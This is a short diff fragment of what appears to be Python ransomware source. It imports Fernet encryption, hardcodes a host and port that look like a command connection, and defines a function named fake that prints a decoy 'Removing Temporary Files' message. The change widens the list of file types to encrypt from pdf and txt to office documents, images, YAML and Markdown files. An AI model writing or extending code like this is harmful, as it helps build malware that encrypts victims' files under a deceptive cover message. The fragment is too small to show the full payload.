@@ -29,7 +29,7 @@ from cryptography.fernet import Fernet
 
 port=11111
 host='192.168.1.127'
-encr=['pdf','txt']
+encr=['pdf','txt','xlsx','docx','doc','xlx','png','jpeg','yml','md']
 
 def fake():
     print("Removing Temporary Files:")
